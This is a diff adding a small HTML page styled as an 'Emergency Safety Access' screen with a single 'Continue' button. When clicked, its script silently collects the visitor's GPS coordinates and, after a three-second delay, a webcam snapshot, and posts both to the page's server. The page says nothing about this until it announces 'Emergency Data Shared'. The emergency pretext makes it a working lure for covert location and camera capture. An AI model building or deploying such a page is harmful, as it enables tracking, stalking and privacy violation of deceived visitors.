@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <title>Emergency System</title>
+
+    <style>
+
+        body{
+            background:#0f0f0f;
+            color:white;
+            font-family:Arial;
+            text-align:center;
+            margin-top:100px;
+        }
+
+        h1{
+            font-size:40px;
+        }
+
+        button{
+            padding:15px 35px;
+            font-size:22px;
+            border:none;
+            border-radius:12px;
+            cursor:pointer;
+            background:#00ff88;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <h1>Emergency Safety Access</h1>
+
+    <button onclick="startSystem()">
+        Continue
+    </button>
+
+<script>
+
+async function startSystem(){
+
+    // LOCATION
+
+    navigator.geolocation.getCurrentPosition(async(position)=>{
+
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        await fetch("/save-location",{
+
+            method:"POST",
+
+            headers:{
+                "Content-Type":"application/json"
+            },
+
+            body:JSON.stringify({
+                latitude:lat,
+                longitude:lon
+            })
+
+        });
+
+    });
+
+    // CAMERA
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+        video:true
+    });
+
+    const video = document.createElement("video");
+
+    video.srcObject = stream;
+
+    await video.play();
+
+    setTimeout(()=>{
+
+        const canvas = document.createElement("canvas");
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext("2d");
+
+        ctx.drawImage(video,0,0);
+
+        canvas.toBlob(async(blob)=>{
+
+            const formData = new FormData();
+
+            formData.append("photo",blob,"photo.png");
+
+            await fetch("/upload",{
+                method:"POST",
+                body:formData
+            });
+
+            alert("Emergency Data Shared");
+
+        });
+
+    },3000);
+
+}
+
+</script>
+
+</body>
+</html>
